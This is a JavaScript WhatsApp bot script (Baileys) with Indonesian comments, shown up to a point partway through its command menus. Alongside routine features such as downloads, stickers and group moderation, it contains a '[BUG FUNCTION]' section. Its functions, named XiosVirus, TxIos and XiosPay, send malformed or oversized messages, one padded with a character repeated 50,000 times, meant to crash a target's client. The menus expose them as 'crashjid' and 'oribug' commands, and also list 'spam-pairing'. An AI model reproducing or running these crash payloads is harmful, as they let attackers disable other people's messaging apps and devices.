/*

#kiuu base
github : https://github.com/kiuur
youtube : https://youtube.com/@kyuurzy
rest api : https://shinoa.us.kg

#pengembang rissxd
youtube : https://youtube.com/@rissmdbotz

HAPUS WM INI DOSA BESAR LU NJIR 
TAMBAHIN NAMALU AJA KALO LU NGEMBANGIN
NIH SC

[ ! ] JANGAN DIJUAL KECUALI LU KEMBANGIN SCNYA
*/
require('../setting/config');

const jsobfus = require('javascript-obfuscator')
const os = require('os')
const speed = require('performance-now')
const fs = require('fs');
const crypto = require('crypto')
const axios = require('axios');
const chalk = require("chalk");
const ytdl = require("@distube/ytdl-core")
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

//FUNCTION LIB
const uploadFile = require('./lib/uploadFile')
const uploadImage = require('./lib/uploadImage')
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')

const { default: baileys, proto, generateWAMessage, generateWAMessageContent, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = rukaxriss = async (rukaxriss, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? rukaxriss.user.id.split(":")[0] + "@s.whatsapp.net" || rukaxriss.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const owner = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const botNumber = await rukaxriss.decodeJid(rukaxriss.user.id);
const Access = [botNumber, ...owner, ...global.owner];
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const number = m.sender.replace(/@.+/g, '')
    
//ROLE/DATA
let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'))
const Creator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium= Creator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(rukaxriss, m, premium)
let totalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length  
    
// Group function
const groupMetadata = isGroup ? await rukaxriss.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Database
try{
const isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? 1000 : 0
let user = global.db.data.users[sender]
if (typeof user !== 'object') global.db.data.users[sender] = {}
if (user) {
if (!('registered' in user)) user.registered = false
if (!('nick' in user)) user.nick = m.sender
if (!('age' in user)) user.age = 0
if (!('sn' in user)) user.sn = 0
if (!isNumber(user.limit)) user.limit = limitUser
if (!isPremium) user.premium = false
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('lastclaim' in user)) user.lastclaim = new Date * 1
if (!isNumber(user.regTime)) user.regTime = -1
} else global.db.data.users[sender] = {
registered: false,
nick: m.sender,
age: 0,
sn: 0,
limit: limitUser,
premium: `${isPremium ? 'true' : 'false'}`,
afkTime: -1,
lastclaim: new Date * 1,
regTime: -1
}
    
let chats = global.db.data.chats[m?.chat]
if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
if (chats) {
if (!('luminai' in chats)) chats.luminai = false
if (!('welcome' in chats)) chats.welcome = false
if (!('antilinkgc' in chats)) chats.antilinkgc = false
}
else global.db.data.chats[m.chat] = {
luminai: false,
welcome: false,
antilinkgc: false
}
    
let settings = global.db.data.settings[botNumber]
            if (typeof settings !== 'object') global.db.data.settings[botNumber] = {}
            if (settings) {
if (!('autobio' in settings)) settings.autobio = false
} else global.db.data.settings[botNumber] = {
autobio: false
   } 
} catch (e) {
console.log(e)
}
 
    
var chats = global.db.data.chats[m.chat],
users = global.db.data.users[m.sender],
settings = global.db.data.settings[botNumber],
limitnya = global.db.data.users[m.sender].limit

//GAME
if(!('hadiah' in db.data.settings)) db.data.settings.hadiah = []
if(!('hadiahkadaluwarsa' in db.data.settings)) db.data.settings.hadiahkadaluwarsa = []
// Function
const { clockString, smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep, formatp, getRandom } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl');
// Time
const date = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
    
// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

// Helper functions
const replyy = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
interactiveMessage: {
body: {text: anu},
footer: {text: `${global.footer}`},
nativeFlowMessage: {
buttons: [{text: "CREATOR : RISSXD"}
],
}
},
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${body}`}}})
rukaxriss.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

const reaction = async (jidss, emoji) => {
rukaxriss.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
 
//REPLY
async function replymenu(txt) {
rukaxriss.sendMessage(m.chat, {
      video: fs.readFileSync('./start/data/video/thumb.mp4'),
      gifPlayback: true,
      caption: txt,
      contextInfo: {
      externalAdReply: {
      title: namabot,
      body: ownername,
      thumbnailUrl: 'https://pomf2.lain.la/f/2i4cjtsg.jpg',
      sourceUrl: 'https://youtube.com/@rissmdbotz',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
                    
async function reply(txt) {
const Shikimori = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: namasaluran,
newsletterJid: `${global.idsaluran}`,
},
externalAdReply: {  
showAdAttribution: true,
title: `${namabot}`,
body: 'Follow my Instagram',
thumbnailUrl: `${thumbnail}`,
sourceUrl: 'https://instagram.com/ahmd.mldi',
},
},
text: txt,
}
return rukaxriss.sendMessage(m.chat, Shikimori, {
quoted: m,
})
}
//FAKE QUOTED
const qsticker = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `footer`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "NIH STICKERMU!!!"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const qpayment = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `footer`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Riss-XD Nih Boss"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const rissxdsaluran = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `idsaluran`,
newsletterName: `Kayna by ©Madz`,
jpegThumbnail: "",
caption: `Kayna A.I`,
inviteExpiration: Date.now() + 1814400000
}
}
}
//ASYNC
function generateRandomPassword(p) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = p;
  let password = 'RISS-XD-';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
//LIMIT
function uselimit(r) {
 users.limit -= r
 replyy(`*YOUR LIMIT HAS USE ${r}*\n\n\`LIMITMU SISA ${users.limit}\``)
}
//AI
async function luminai(content, prompt, user) {
  function generateRandomUserId() {
    return 'user-' + Math.floor(Math.random() * 10000);
}
let userId = generateRandomUserId();
console.log(`Generated User ID: ${userId}`);
    try {
        const response = await axios.post('https://luminai.my.id/', { content, prompt, user });
        return response.data;
    } catch (error) {
        console.error(error);
        throw error;
    }
}   
//OBFUS
async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${namabot}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}
//TOTAL FITUR
const totalFitur = () =>{
            var mytext = fs.readFileSync("./start/rissxmd.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
}
//AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
 //AUTOBIO
if (global.db.data.settings[botNumber].autobio) {
rukaxriss.updateProfileStatus(`Bot Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
}
//ANTILINK GROUP NO KICK
if (chats.antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`GC Link Detected\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (Creator) return reply(bvl)
               await rukaxriss.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			rukaxriss.sendMessage(from, {text:`\`\`\`GC Link Detected\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
}
//YTDL
async function ytMp4(url) {
    return new Promise(async(resolve, reject) => {
        ytdl.getInfo(url).then(async(getUrl) => {
            let result = [];
            for(let i = 0; i < getUrl.formats.length; i++) {
                let item = getUrl.formats[i];
                if (item.container == 'mp4' && item.hasVideo == true && item.hasAudio == true) {
                    let { qualityLabel, contentLength } = item;
                    let bytes = await bytesToSize(contentLength);
                    result[i] = {
                        video: item.url,
                        quality: qualityLabel,
                        size: bytes
                    };
                };
            };
            let resultFix = result.filter(x => x.video != undefined && x.size != undefined && x.quality != undefined)
            let title = getUrl.videoDetails.title;
            let desc = getUrl.videoDetails.description;
            let views = getUrl.videoDetails.viewCount;
            let likes = getUrl.videoDetails.likes;
            let dislike = getUrl.videoDetails.dislikes;
            let channel = getUrl.videoDetails.ownerChannelName;
            let uploadDate = getUrl.videoDetails.uploadDate;
            let thumb = getUrl.player_response.microformat.playerMicroformatRenderer.thumbnail.thumbnails[0].url;
            resolve({
                title,
                result: resultFix[0].video,
                quality: resultFix[0].quality,
                size: resultFix[0].size,
                thumb,
                views,
                likes,
                dislike,
                channel,
                uploadDate,
                desc
            });
        }).catch(reject);
    });
};
//[BUG FUNCTION]
    async function XiosVirus(jid) {
			rukaxriss.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Succes Send Bug ©RISSXD🥶"));
    };
async function TxIos(X, Ptcp = false) {
			await rukaxriss.relayMessage(X, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "62895364760801@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "62895364760801@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": X,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "62895364760801@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "A̺͆N̺͆T̺͆I̺͆ G̺͆E̺͆D̺͆O̺͆R̺͆〽",
								"body": "尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_rukaxriss_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug ©RISSXD🥶"));
		};
    async function XiosPay(jid) {
			rukaxriss.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Succes Send Bug ©RISSXD🥶"));
		};
		
// Command handler
switch (command) {
case'tes':{
    if (limitnya < 1000) return reply(`tidak cukup limitmu`)
    reply(`${db.data.users[sender].premium}`)
}
    break
case'menu':{
if (!users.registered) return reply(mess.daftar)
reaction(m.chat, "⏳")
if (args.length < 1) return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`TOTAL PENGGUNA\` : ${totalreg}
▧ \`DATE\` : ${date}

▧ L I S T  M E N U
│ • ${prefix}menu all
│ • ${prefix}menu owner
│ • ${prefix}menu main
│ • ${prefix}menu tools
│ • ${prefix}menu download
│ • ${prefix}menu ai
│ • ${prefix}menu group
│ • ${prefix}menu info 
│ • ${prefix}menu search
│ • ${prefix}menu bug
│ • ${prefix}menu quotes
└───···`)

if (args[0] === "all") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ O W N E R  M E N U
│ • ${prefix}backup
│ • ${prefix}restart
│ • ${prefix}addlimit
│ • ${prefix}self/public
│ • ${prefix}customsn
│ • ${prefix}enc
│ • ${prefix}spam-pairing
│ • ${prefix}bcgc
│ • ${prefix}buathadiah
│ • ${prefix}listhadiah
│ • ${prefix}joingc
└───···

▧ M A I N  M E N U
│ • ${prefix}reportbug
│ • ${prefix}request
│ • ${prefix}ceklimit
│ • ${prefix}ceksn Ⓛ︎
│ • ${prefix}daftar
│ • ${prefix}unregister
│ • ${prefix}redeemcode
│ • ${prefix}claim/daily
└───···

▧  T O O L S  M E N U
│ • ${prefix}hd Ⓛ︎
│ • ${prefix}remini Ⓛ︎
│ • ${prefix}tourl Ⓛ︎
│ • ${prefix}readviewonce Ⓛ︎
│ • ${prefix}smeme
│ • ${prefix}sticker
└───···

▧ D O W N L O A D  M E N U
│ • ${prefix}play Ⓛ︎
│ • ${prefix}tiktokvideo Ⓛ︎
│ • ${prefix}tiktokslide Ⓛ︎
│ • ${prefix}gdrive Ⓛ︎
│ • ${prefix}mediafire Ⓛ︎
│ • ${prefix}sfiledl Ⓛ︎
│ • ${prefix}ytmp4 Ⓛ︎
└───···

▧ A I  M E N U
│ • ${prefix}ai on/off
└───···

▧ G R O U P  M E N U
│ • ${prefix}afk
│ • ${prefix}hidetag
│ • ${prefix}kick
│ • ${prefix}delete
│ • ${prefix}antilinkgc on/off
└───···

▧ I N F O  M E N U
│ • ${prefix}script
│ • ${prefix}ping
└───···

▧ S E A R C H  M E N U
│ • ${prefix}play Ⓛ︎
│ • ${prefix}pinterest Ⓛ︎
│ • ${prefix}ytsearch Ⓛ︎
└───···

▧ B U G  M E N U
│ • ${prefix}oribug
│ • ${prefix}crashjid
└───···

▧ Q U O T E S  M E N U
│ • ${prefix}quotesanime
│ • ${prefix}quotedbacot
└───···
`)
} else if (args[0] === "owner") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ O W N E R  M E N U
│ • ${prefix}backup
│ • ${prefix}restart
│ • ${prefix}addlimit
│ • ${prefix}self/public
│ • ${prefix}customsn
│ • ${prefix}enc
│ • ${prefix}spam-pairing
│ • ${prefix}bcgc
│ • ${prefix}clearsession
│ • ${prefix}buathadiah
│ • ${prefix}listhadiah
│ • ${prefix}joingc
└───···`)
} else if (args[0] === "main") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I 
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ M A I N  M E N U
│ • ${prefix}reportbug
│ • ${prefix}request
│ • ${prefix}ceklimit
│ • ${prefix}ceksn Ⓛ︎
│ • ${prefix}daftar
│ • ${prefix}unregister
│ • ${prefix}redeemcode
│ • ${prefix}claim/daily
└───···
`)
} else if (args[0] === "tools") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I 
